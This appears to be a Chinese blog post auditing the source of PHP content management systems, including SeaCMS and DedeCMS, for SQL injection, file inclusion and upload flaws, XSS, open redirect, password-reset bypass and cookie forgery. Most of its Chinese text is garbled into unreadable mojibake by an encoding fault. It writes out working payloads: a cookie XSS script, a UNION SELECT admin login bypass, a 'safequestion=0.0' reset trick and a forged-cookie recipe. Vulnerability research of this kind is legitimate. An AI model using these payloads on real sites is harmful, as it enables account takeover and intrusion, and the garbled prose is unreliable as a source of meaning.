alt="image-20221202185616902"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰å¯¹sqlè¯­å¥åšä»»ä½•å¤„ç†ï¼Œç›´æ¥ç”¨mysql_queryè¿›è¡ŒæŸ¥è¯¢ï¼Œsqlè¯­å¥é”™è¯¯æ—¶ï¼Œè¿”å›é”™è¯¯æ¶ˆæ¯Query errorï¼Œç„¶åæ˜¯å‰é¢åŠ äº†ä¸€ä¸ª@ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨æŠ¥é”™æ³¨å…¥ã€‚</p><p>å†è§‚å¯Ÿinclude&#x2F;mysql.class.phpå¯ä»¥å‘ç°</p><p><img src="/../images/image-20221202190550614.png" alt="image-20221202120844185">å‘ç°å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ï¼Œé‚£ä¹ˆè¿™ä¸ªCMSå°±å¯ä»¥éšä¾¿æ³¨å…¥äº†ã€‚ã€‚ã€‚ï¼ˆå› ä¸ºæ‰€æœ‰çš„sqlæ“ä½œéƒ½æ˜¯ç”¨è¿™ä¸ªmysqlç±»ï¼‰</p><p>ä»¥ad_js.phpä¸ºä¾‹</p><p><img src="/../imaages/image-20221202190230473.png" alt="image-20221202120844185"></p><p><img src="/../images/image-20221202190707634-1686141975684.png" alt="image-20221202190707634"></p><h4 id="æ–‡ä»¶åŒ…å«-æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶åŒ…å«-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶åŒ…å«+æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶åŒ…å«+æ–‡ä»¶ä¸Šä¼ </h4><p>è™½ç„¶æœ‰ç™½åå•é™åˆ¶ï¼Œåªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œè¿‡æ»¤</p><p><img src="/../images/image-20221202171406255-1686141975684.png" alt="image-20221202171406255"></p><p>å¹¶ä¸”åœ¨user.phpä¸­ï¼Œæ²¡æœ‰å¯¹$_POST[â€˜payâ€™]è¿›è¡Œè¿‡æ»¤ï¼Œå­˜åœ¨ç›®å½•ç©¿è¶Šï¼Œå°±å¯ä»¥åŒ…å«ä¸Šä¼ çš„ç”¨æˆ·å¤´åƒã€‚</p><p><img src="/../images/image-20221202185910243-1686141975684.png" alt="image-20221202185910243"></p><h4 id="ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="ä»»æ„æ–‡ä»¶åˆ é™¤"></a>ä»»æ„æ–‡ä»¶åˆ é™¤</h4><p>publish.php</p><p><img src="/../images/image-20221202190938927-1686141975684.png" alt="image-20221202190938927"></p><p>user.php</p><p>â€‹<img src="/../images/image-20221202194855624-1686141975684.png" alt="image-20221202194855624"></p><p>éœ€è¦å…ˆæ’å…¥ä¸€æ¡æ–°é—»ï¼Œæ–°é—»åä¸ºè¦åˆ é™¤çš„æ–‡ä»¶çš„è·¯å¾„ã€‚</p><h3 id="åå°â€“-x2F-admin"><a href="#åå°â€“-x2F-admin" class="headerlink" title="åå°â€“&#x2F;admin"></a>åå°â€“&#x2F;admin</h3><p>è¿˜æ˜¯å…ˆçœ‹ä¸€ä¸‹index.phpï¼Œä¹Ÿæ˜¯åªæ˜¯è¾“å‡ºäº†CMSå’Œç³»ç»Ÿçš„ä¸€äº›ä¿¡æ¯ï¼Œæ‰€ä»¥å…³æ³¨å…¶åŒ…å«çš„æ–‡ä»¶</p><p><img src="/../images/image-20221202191939851-1686141975684.png" alt="image-20221202191939851"></p><p>å…³é”®å†…å®¹</p><p><img src="/../images/image-20221202192232288-1686141975684.png" alt="image-20221202192232288"></p><p>å¯¹è¾“å…¥çš„å‚æ•°éƒ½ä½¿ç”¨addslashes()è¿›è¡Œè½¬ä¹‰,ä¸è¿‡è¿˜æœ‰<code>$SERVER</code>æ²¡æœ‰è¿›è¡Œå¤„ç†ã€‚</p><p><img src="/../images/image-20221202192459456.png" alt="image-20221202120844185"></p><p>â€‹ä½¿ç”¨sessionæ¥éªŒè¯adminèº«ä»½ã€‚è¿˜æ˜¯ä¸€æ ·çš„ä½¿ç”¨check_cookieæ¥åˆ¤æ–­ï¼Œ</p><p>â€‹<img src="/../images/image-20221202140225964.png" alt="image-20221202120844185"></p><p>â€‹éœ€è¦å¾—åˆ°adminçš„pwdå’Œcookie_hashï¼Œè¿™ä¸¤ä¸ªéƒ½åœ¨æ•°æ®åº“ä¸­ï¼Œå¯ä»¥åˆ©ç”¨å‰å°çš„sqlæ³¨å…¥è·å¾—ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥ç™»å½•adminç”¨æˆ·ã€‚</p><h4 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h4><p><img src="/../images/image-20221202195311948-1686141975684.png" alt="image-20221202195311948"></p><p><img src="/../images/image-20221202195409112-1686141975684.png" alt="image-20221202195409112"></p><h4 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>ä»»æ„æ–‡ä»¶ä¸Šä¼ </h4><p><img src="/../images/image-20221202191243192.png" alt="image-20221202120844185"></p><p><img src="/../images/image-20221202191403061.png" alt="image-20221202120844185"></p><p>æ–‡ä»¶è·¯å¾„åªä½œäº†å»é™¤å¤´å°¾ç©ºæ ¼çš„å¤„ç†ï¼Œå­˜åœ¨ç›®å½•ç©¿è¶Šï¼›æ–‡ä»¶å†…å®¹å®é™…ä¸Šæ˜¯è°ƒç”¨äº†stripslashesï¼Œå¹¶æ²¡æœ‰è¿‡æ»¤ã€‚</p><p>æµ‹è¯•</p><p><img src="/../images/image-20221202194248639.png" alt="image-20221202120844185"></p><img src="E:\typora img\image-20221202194300861.png" alt="image-20221202194300861" style="zoom:80%;" /><h1 id="SeaCMS"><a href="#SeaCMS" class="headerlink" title="SeaCMS"></a>SeaCMS</h1><p>ç½‘ç«™æ¶æ„ï¼Œæ— æ¡†æ¶ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">â”œâ”€admin   <span class="comment"># åå°</span></span><br><span class="line">â”œâ”€css  <span class="comment"># å­˜æ”¾cssæ–‡ä»¶</span></span><br><span class="line">â”œâ”€files  <span class="comment"># å­˜æ”¾é¡µé¢</span></span><br><span class="line">â”œâ”€images  <span class="comment"># å­˜æ”¾å›¾ç‰‡</span></span><br><span class="line">â”œâ”€inc  <span class="comment"># å­˜æ”¾ç½‘ç«™é…ç½®ï¼Œæ ¡éªŒï¼Œè¿‡æ»¤æ–‡ä»¶</span></span><br><span class="line">â”œâ”€install <span class="comment"># ç½‘ç«™å®‰è£…</span></span><br><span class="line">â”œâ”€seacmseditor <span class="comment"># ç½‘ç«™ç¼–è¾‘å™¨</span></span><br><span class="line">â”œâ”€template <span class="comment"># ç½‘ç«™æ¨¡æ¿</span></span><br><span class="line">â””â”€upload   <span class="comment"># å­˜æ”¾ä¸Šä¼ æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹å…¥å£æ–‡ä»¶"><a href="#æŸ¥çœ‹å…¥å£æ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹å…¥å£æ–‡ä»¶"></a>æŸ¥çœ‹å…¥å£æ–‡ä»¶</h2><p>æ‰€æœ‰çš„å…¥å£éƒ½æ˜¯é€šè¿‡ä¼ é€’rå‚æ•°æ¥åˆ†å‘è·¯ç”±ï¼Œå¯¹åº”filesç›®å½•ä¸­çš„æ–‡ä»¶</p><p><img src="/../images/image-20230525134023397-1686141975684.png" alt="image-20230525134023397"></p><p><img src="/../images/image-20230525141822013-1686141975684.png" alt="image-20230525141822013"></p><p>è¿™é‡Œåªç”¨<code>addslashes</code>è¿›è¡Œäº†è½¬ä¹‰ï¼Œæ˜æ˜¾è·¯å¾„ç©¿è¶Š+æ–‡ä»¶åŒ…å«</p><p><img src="/../images/image-20230525134741282-1686141975685.png" alt="image-20230525134741282"></p><p>å…¶ä»–æ€è·¯</p><ul><li><p>å¦‚æœæ˜¯linuxç³»ç»Ÿï¼Œä¹Ÿå¯ä»¥é€šè¿‡<code>pearcmd.php</code>æ¥getshell</p><blockquote><p>åœ¨7.3åŠä»¥å‰ï¼Œpecl&#x2F;pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®šâ€“with-pearæ‰ä¼šå®‰è£…</p></blockquote></li><li><p>å°è¯•%00æˆªæ–­è·¯å¾„ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸çŸ¥é“ä¸ºå•¥å¤±è´¥äº†ï¼Œç¯å¢ƒï¼šphp5.3.29ï¼Œ<strong>magic_quotes_gpc</strong>&#x3D;OFF</p></li><li><p>å¦‚æœphpç‰ˆæœ¬å°äº5.2.8ï¼Œlinux éœ€è¦æ–‡ä»¶åé•¿äº 4096ï¼Œwindows éœ€è¦é•¿äº 256ï¼Œè¶…è¿‡éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒä»è€Œå®ç°æ–‡ä»¶åŒ…å«ç»•è¿‡åç¼€.phpé™åˆ¶</p></li></ul><h2 id="æŸ¥çœ‹é…ç½®æ–‡ä»¶"><a href="#æŸ¥çœ‹é…ç½®æ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹é…ç½®æ–‡ä»¶"></a>æŸ¥çœ‹é…ç½®æ–‡ä»¶</h2><p>é€šè¿‡installç›®å½•ä¸‹çš„InstallLock.txtæ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­æ˜¯å¦å®‰è£…ï¼Œå¦‚æœå¯ä»¥åˆ é™¤è¯¥æ–‡ä»¶ï¼Œå°±å¯ä»¥é…åˆå…¥å£æ–‡ä»¶çš„æ–‡ä»¶åŒ…å«æ¼æ´æ¥é‡æ–°å®‰è£…ç½‘ç«™ã€‚</p><p><img src="/../images/image-20230525135351792-1686141975685.png" alt="image-20230525135351792"></p><p>æ•°æ®åº“ç¼–ç ä¸º<code>utf-8</code>ï¼Œä¸å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥</p><p><img src="/../images/image-20230525135521039-1686141975685.png" alt="image-20230525135521039"></p><h2 id="æŸ¥çœ‹èº«ä»½æ ¡éªŒæ–‡ä»¶"><a href="#æŸ¥çœ‹èº«ä»½æ ¡éªŒæ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹èº«ä»½æ ¡éªŒæ–‡ä»¶"></a>æŸ¥çœ‹èº«ä»½æ ¡éªŒæ–‡ä»¶</h2><p><img src="/../images/image-20230525140710113-1686141975685.png" alt="image-20230525140710113"></p><p>å‚ç›´è¶Šæƒï¼Œåªè¦åœ¨cookieä¸­åŠ å…¥userå€¼</p><p><img src="/../images/image-20230525140957487-1686141975685.png" alt="image-20230525140957487"></p><h2 id="å‰å°-1"><a href="#å‰å°-1" class="headerlink" title="å‰å°"></a>å‰å°</h2><h3 id="about-php"><a href="#about-php" class="headerlink" title="about.php"></a><code>about.php</code></h3><p><img src="/../images/image-20230525141923350-1686141975685.png" alt="image-20230525141923350"></p><p>ä½¿ç”¨<code>addslashes</code>æ¥è¿‡æ»¤ï¼Œé€ƒé€¸ä¸äº†å¼•å·ï¼Œæ‰€ä»¥ä¸å­˜åœ¨sqlæ³¨å…¥</p><h3 id="concat-php"><a href="#concat-php" class="headerlink" title="concat.php"></a><code>concat.php</code></h3><p>sqléƒ½ç”¨äº†<code>addslashes</code>æ¥è¿‡æ»¤</p><p>ä½†æ˜¯å­˜åœ¨xss</p><p><img src="/../images/image-20230525142829890-1686141975685.png" alt="image-20230525142829890"></p><p><img src="/../images/image-20230525142841766-1686141975685.png" alt="image-20230525142841766"></p><p><img src="/../images/image-20230525143133231-1686141975685.png" alt="image-20230525143133231"></p><p><img src="/../images/image-20230525143813133-1686141975685.png" alt="image-20230525143813133"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cookie:name=<span class="string">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230525144008677-1686141975686.png" alt="image-20230525144008677"></p><h3 id="content-php"><a href="#content-php" class="headerlink" title="content.php"></a><code>content.php</code></h3><p>å­˜åœ¨æ•°å­—å‹ç»ˆäºå¯ä»¥æ³¨å…¥äº†ï¼Œé…åˆ<code>mysql_error</code>è¿›è¡ŒæŠ¥é”™æ³¨å…¥</p><p><img src="/../images/image-20230525144109692-1686141975686.png" alt="image-20230525144109692"></p><p><img src="/../images/image-20230525144251129-1686141975686.png" alt="image-20230525144251129"></p><h3 id="submit-php"><a href="#submit-php" class="headerlink" title="submit.php"></a><code>submit.php</code></h3><p><img src="/../images/image-20230525145929543-1686141975686.png" alt="image-20230525145929543"></p><p><img src="/../images/image-20230525151458927-1686141975686.png" alt="image-20230525151458927"></p><p>å› ä¸ºéªŒè¯ç æ­£ç¡®åä¹Ÿä¸åˆ·æ–°ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªéªŒè¯ç è¿›è¡Œæ³¨å…¥</p><p><img src="/../images/image-20230525151429571-1686141975686.png" alt="image-20230525151429571"></p><p>å­˜å‚¨xss</p><p>è¿‡æ»¤</p><p><img src="/../images/image-20230525145800880-1686141975686.png" alt="image-20230525145800880"></p><p>ä½†æ˜¯è¿˜æ˜¯å¯ä»¥åœ¨nameå¤„ä¿å­˜</p><p>è¾“å‡ºç‚¹</p><p><img src="/../images/image-20230525145901519-1686141975686.png" alt="image-20230525145901519"></p><h2 id="åå°"><a href="#åå°" class="headerlink" title="åå°"></a>åå°</h2><h3 id="åå°ç™»å½•-1"><a href="#åå°ç™»å½•-1" class="headerlink" title="åå°ç™»å½•"></a>åå°ç™»å½•</h3><p><img src="/../images/image-20230525153016604-1686141975686.png" alt="image-20230525153016604"></p><p>æ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨è”åˆæŸ¥è¯¢æ„é€ ä¸´æ—¶ç”¨æˆ·æ•°æ®ç™»å½•,æˆ–è€…æŠ¥é”™æ³¨å…¥æ‹¿åˆ°å¯†ç åè§£å¯†ç™»å½•</p><p>åˆ¤æ–­å­—æ®µæ•°</p><p><img src="/../images/image-20230525153002742-1686141975686.png" alt="image-20230525153002742"></p><p>ç¡®å®šç”¨æˆ·åï¼Œå¯†ç å­—æ®µä½ç½®</p><p><img src="/../images/image-20230525154135880-1686141975687.png" alt="image-20230525154135880"></p><p>è”åˆæŸ¥è¯¢ç™»é™†</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">user=-<span class="number">1</span><span class="string">&#x27;+union+select+1,2,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span>c4ca4238a0b923820dcc509a6f75849b<span class="string">&#x27;,5,6,7,8#&amp;password=1&amp;login=yes</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230525154322362-1686141975687.png" alt="image-20230525154322362"></p><h3 id="æ–‡ä»¶ä¸Šä¼ å¤„"><a href="#æ–‡ä»¶ä¸Šä¼ å¤„" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ å¤„"></a>æ–‡ä»¶ä¸Šä¼ å¤„</h3><p><code>up.class.php</code></p><p>ç™½åå•ï¼Œæ–‡ä»¶å¤§å°æ£€æµ‹ï¼Œæ–‡ä»¶æ—¶é—´æˆ³é‡å‘½å,å›¾ç‰‡è£å‰ªç”Ÿæˆç¼©ç•¥å›¾</p><p>æ²¡å•¥ç”¨ï¼Œéœ€è¦é…åˆå…¶ä»–æ¼æ´</p><h1 id="DedeCMS"><a href="#DedeCMS" class="headerlink" title="DedeCMS"></a>DedeCMS</h1><p>è¿›è¡ŒåŠŸèƒ½ç‚¹å®¡è®¡</p><h2 id="å…¨å±€æ€»è§ˆ"><a href="#å…¨å±€æ€»è§ˆ" class="headerlink" title="å…¨å±€æ€»è§ˆ"></a>å…¨å±€æ€»è§ˆ</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å…¥å£æ–‡ä»¶ä¸»è¦æœ‰ä¸‰ä¸ª</span><br><span class="line">å‰å°</span><br><span class="line">åå°ï¼šdede/</span><br><span class="line">ä¼šå‘˜ï¼šmember/</span><br></pre></td></tr></table></figure><p>å…¨å±€å‡½æ•°<br>åœ¨é¡¹ç›®æ ¹ç›®å½•çš„indexæ–‡ä»¶åŒ…å«çš„&#x2F;include&#x2F;common.inc.phpä¸­<br>è¿‡æ»¤çš„ï¼š</p><p>æ£€æŸ¥å’Œæ³¨å†Œå¤–éƒ¨æäº¤çš„å˜é‡ï¼Œ<code>CheckRequest</code></p><p><img src="/../images/image-20230526102737909-1686141975687.png" alt="image-20230526102737909"></p><p>æ–‡ä»¶ä¸Šä¼ çš„</p><p><img src="/../images/image-20230526102806414-1686141975687.png" alt="image-20230526102806414"></p><p>åˆ†é¡µå‚æ•°çš„</p><p><img src="/../images/image-20230526102852980-1686141975687.png" alt="image-20230526102852980"></p><p>å‡½æ•°é›†</p><p><img src="/../images/image-20230526102920759-1686141975687.png" alt="image-20230526102920759"></p><p><code>include/filter.inc.php</code></p><p>è¿‡æ»¤ä¸æ–‡æ˜å†…å®¹çš„ğŸ˜…ï¼Œä¸æ˜¯ä¸ºäº†é˜²å¾¡æ¼æ´çš„</p><h2 id="æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹"><a href="#æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹"></a>æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹</h2><h3 id="dede-archives-do-php"><a href="#dede-archives-do-php" class="headerlink" title=" /dede/archives_do.php"></a><code> /dede/archives_do.php</code></h3><p><img src="/../images/image-20230525201745708-1686141975687.png" alt="image-20230525201745708"></p><p><img src="/../images/image-20230525200159854-1686141975687.png" alt="image-20230525200159854"></p><p>å®é™…ä¸Šæ˜¯è°ƒç”¨äº†<code>upload.helper.php</code>ä¸­çš„<code>AdminUpload</code>æ–¹æ³•</p><p><img src="/../images/image-20230525201545164-1686141975687.png" alt="image-20230525201545164"></p><p><img src="/../images/image-20230525201700590-1686141975687.png" alt="image-20230525201700590"></p><p>å¯ä»¥çœ‹åˆ°åªå¯¹æ–‡ä»¶çš„MIMEç±»å‹è¿›è¡Œäº†æ ¡éªŒ,æ²¡æœ‰å¯¹æ–‡ä»¶åç¼€è¿›è¡Œæ ¡éªŒ</p><p>å†çœ‹ä¸€ä¸‹å…¨å±€é˜²æŠ¤<code>uploadsafe.inc.php</code></p><p><img src="/../images/image-20230525201856657-1686141975688.png" alt="image-20230525201856657"></p><p><img src="/../images/image-20230525201949967-1686141975688.png" alt="image-20230525201949967"></p><p>è™½ç„¶æœ‰é»‘åå•ï¼Œä½†æ˜¯é»‘åå•å¯¹ç®¡ç†å‘˜ç”¨æˆ·æ— æ•ˆ</p><p><img src="/../images/image-20230525202104709-1686141975688.png" alt="image-20230525202104709"></p><p>æœ€åç”¨<code>getimagesize</code>è¿›è¡Œæ ¡éªŒï¼Œå¯ä»¥æ·»åŠ æ–‡ä»¶å¤´ç»•è¿‡ã€‚</p><p>ç»¼ä¸Šæ‰€å±ï¼Œæ˜¯ç®¡ç†å‘˜èº«ä»½ï¼Œåªéœ€è¦ä¿®æ”¹MIMEå’Œæ–‡ä»¶å¤´å³å¯ç»•è¿‡è¿‡æ»¤ã€‚</p><p><img src="/../images/image-20230525191610086-1686141975688.png" alt="image-20230525191610086"></p><p><img src="/../images/image-20230525191553945-1686141975688.png" alt="image-20230525191553945"></p><h3 id="dede-media-add-php"><a href="#dede-media-add-php" class="headerlink" title="/dede/media_add.php"></a><code>/dede/media_add.php</code></h3><p><img src="/../images/image-20230525205532459-1686141975688.png" alt="image-20230525205532459"></p><p>è·Ÿä¸Šä¸€ä¸ªå·®ä¸å¤šï¼Œåªæ ¡éªŒMIMEï¼Œä¸æ ¡éªŒåç¼€ï¼Œåªæ˜¯å¤šäº†ä¸€æ­¥åŠ æ°´å°çš„ï¼Œæ‰€ä»¥ä¼ ä¸€ä¸ªphpåç¼€çš„å›¾ç‰‡é©¬</p><p><img src="/../images/image-20230525205858924-1686141975688.png" alt="image-20230525205858924"></p><h3 id="dede-file-manage-control-php"><a href="#dede-file-manage-control-php" class="headerlink" title="/dede/file_manage_control.php"></a><code>/dede/file_manage_control.php</code></h3><p><img src="/../images/image-20230525204329712-1686141975689.png" alt="image-20230525204329712"></p><p><img src="/../images/image-20230525210840452-1686141975688.png" alt="image-20230525210840452"></p><p><img src="/../images/image-20230525211553932-1686141975689.png" alt="image-20230525211553932"></p><p>æ²¡æœ‰å¯¹å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œè¿™é‡Œå¯ä»¥å†™ğŸ</p><h2 id="URLé‡å®šå‘"><a href="#URLé‡å®šå‘" class="headerlink" title="URLé‡å®šå‘"></a>URLé‡å®šå‘</h2><p><code>plus/download.php</code></p><p><img src="/../images/image-20230526100708534-1686141975688.png" alt="image-20230526100708534"></p><p><img src="/../images/image-20230526100724469-1686141975689.png" alt="image-20230526100724469"></p><p><img src="/../images/image-20230526101319599-1686141975690.png" alt="image-20230526101319599"></p><p><code>$linkinfo</code>å‹æ ¹ä¸å­˜åœ¨ï¼Œæ²¡æœ‰è¿‡æ»¤ï¼Œå¯¹urlå…ˆè¿›è¡Œbase64åŠ å¯†ï¼Œå†è¿›è¡ŒurlåŠ å¯†å³å¯</p><p><img src="/../images/image-20230526101138188-1686141975689.png" alt="image-20230526101138188"></p><h2 id="ä¼šå‘˜ä»»æ„å¯†ç ä¿®æ”¹"><a href="#ä¼šå‘˜ä»»æ„å¯†ç ä¿®æ”¹" class="headerlink" title="ä¼šå‘˜ä»»æ„å¯†ç ä¿®æ”¹"></a>ä¼šå‘˜ä»»æ„å¯†ç ä¿®æ”¹</h2><p>å…ˆçœ‹ä¸€ä¸‹ä¼šå‘˜ä¸­å¿ƒçš„é€»è¾‘</p><p><code>member/index.php</code></p><p>æ ¡éªŒç”¨æˆ·æ˜¯å¦ç™»å½•ï¼Œç™»å½•åˆ™è¿›å…¥ä¼šå‘˜ä¸ªäººä¸­å¿ƒ</p><p><code>member/index_do.php</code></p><p>ä¼šå‘˜æ“ä½œä¸<code>$fmdo</code>å‚æ•°åŒ¹é…</p><p>é‡ç½®å¯†ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index_do.php?fmdo=user&amp;dopost=xxx</span><br></pre></td></tr></table></figure><p>é‡ç½®å¯†ç é€»è¾‘åœ¨<code>resetpassword.php</code>ä¸­,å¤§è‡´é€»è¾‘å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&quot;/templets/resetpassword.htm&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$dopost</span> == <span class="string">&quot;getpwd&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// æ‰¾å›å¯†ç ç¬¬ä¸€æ­¥</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;safequestion&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// å¯†ç é—®é¢˜åˆ¤æ–­</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;getpasswd&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// æ‰¾å›å¯†ç ç¬¬äºŒæ­¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹å…³æ³¨å¯†ç é—®é¢˜åˆ¤æ–­</p><p><img src="/../images/image-20230526123219865-1686141975689.png" alt="image-20230526123219865"></p><p>ä½¿ç”¨äº†å¼±æ¯”è¾ƒï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰è®¾ç½®å¯†ç é—®é¢˜ï¼Œé»˜è®¤å€¼å¦‚ä¸‹</p><p><img src="/../images/image-20230526123041472-1686141975689.png" alt="image-20230526123041472"></p><p>æ‰€ä»¥å¯ä»¥æ„é€ <code>safequestion=0.0&amp;safeanswer=</code>æ¥è¿›å…¥è¯¥ifè¯­å¥</p><p>è·Ÿè¿› snï¼Œæœ€ç»ˆæ˜¯é‡å®šå‘åˆ°ä¿®æ”¹å¯†ç é¡µé¢</p><p><img src="/../images/image-20230526123510601-1686141975689.png" alt="image-20230526123510601"></p><h2 id="ä»»æ„ç”¨æˆ·ç™»å½•"><a href="#ä»»æ„ç”¨æˆ·ç™»å½•" class="headerlink" title="ä»»æ„ç”¨æˆ·ç™»å½•"></a>ä»»æ„ç”¨æˆ·ç™»å½•</h2><p>çœ‹ä¸€ä¸‹æ€ä¹ˆå¤„ç†çš„</p><p><code>member/config.php</code></p><p><img src="/../images/image-20230526130641724-1686141975689.png" alt="image-20230526130641724"></p><p>è·Ÿè¿›</p><p><img src="/../images/image-20230526130848007-1686141975689.png" alt="image-20230526130848007"></p><p><img src="/../images/image-20230526132740089-1686141975689.png" alt="image-20230526132740089"></p><p>å¯¹å¾—åˆ°çš„<code>M_ID</code>åšäº†<code>intval</code>å¤„ç†ï¼Œæœ€åæ ¹æ®<code>M_ID</code>çš„å€¼ä»æ•°æ®åº“ä¸­å–å‡ºå¯¹åº”ç”¨æˆ·</p><p>è·Ÿè¿›<code>getnum</code></p><p><img src="/../images/image-20230526132102568-1686141975689.png" alt="image-20230526132102568"></p><p>è·Ÿè¿›<code>getcookie</code></p><p><img src="/../images/image-20230526131125230-1686141975689.png" alt="image-20230526131125230"></p><p>ä¸¤ä¸ªIFï¼Œç¬¬ä¸€ä¸ªifåˆ¤æ–­Cookieä¸­çš„DedeUserIDå’ŒDedeUserID__ckMD5,å¦‚æœéƒ½å­˜åœ¨è¿›å…¥ç¬¬äºŒä¸ªifï¼Œæ ¡éªŒcookieæœ‰æ•ˆæ€§ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯é€šè¿‡åŠ ç›å†åŠ å¯†çš„æ–¹å¼ï¼Œæ‰€ä»¥æŒ‰ç†è¯´æ˜¯æ— æ³•ä¼ªé€ cookieçš„ã€‚</p><p>ä½†æ˜¯å¯ä»¥ä»<code>/member/index.php</code>å¯ä»¥æ¥è·å–è¿™ä¸ªåŠ å¯†åçš„å€¼</p><p>æœç´¢<code>getcookie</code>å¾—åˆ°</p><p><img src="/../images/image-20230526131657609-1686141975689.png" alt="image-20230526131657609"></p><p>è·Ÿè¸ª<code>$last_vid</code></p><p><img src="/../images/image-20230526132259147-1686141975690.png" alt="image-20230526132259147"></p><p>å¦‚æœ<code>$last_vid</code>ä¸ºç©ºï¼Œé‚£ä¹ˆå°†<code>$uid</code>èµ‹å€¼ç»™<code>$last_vid</code>ï¼Œå¹¶ä½œä¸ºå‚æ•°ä¼ é€’ç»™<code>PutCookie</code>å‡½æ•°</p><p>è·Ÿè¿›<code>PutCookie</code>å‡½æ•°</p><p><img src="/../images/image-20230526132158862-1686141975690.png" alt="image-20230526132158862"></p><p>å¯ä»¥çœ‹åˆ°è·Ÿç™»å½•çš„<code>getcookie</code>åŠ å¯†æ–¹å¼ä¸€æ ·ã€‚</p><p>æ€»ç»“ä¸€ä¸‹ï¼š</p><p>ç™»å½•</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·çš„èº«ä»½ç”±DedeUserIDçš„å€¼æ¥å†³å®š</span><br><span class="line"></span><br><span class="line">æ ¡éªŒï¼šDedeUserID__ckMd5çš„å€¼å’Œ<span class="title function_ invoke__">md5</span>(<span class="variable">$cfg_cookie_encode</span>.DedeUserID)</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>member/index.php?uid=xx</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">last_vid=uid</span><br><span class="line"></span><br><span class="line">last_vid__ckMd5=<span class="title function_ invoke__">md5</span>(<span class="variable">$cfg_cookie_encode</span>.uid)</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è®©</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DedeUserID=last_vid=uid</span><br><span class="line">DedeUserID__ckMd5=last_vid__ckMd5</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥ç»•è¿‡getcookieçš„æ ¡éªŒï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯<code>uid</code>æŒ‡çš„æ˜¯ç”¨æˆ·çš„<code>userid</code>ï¼Œ<code>DedeUserID</code>æŒ‡çš„æ˜¯ç”¨æˆ·çš„<code>mid</code>ï¼Œæ‰€ä»¥è¦è®©<code>uid</code>ä¸º<code>mid</code>æ‰å¯ä»¥ä¼ªé€ èº«ä»½</p><p><img src="/../images/image-20230526134001725-1686141975691.png" 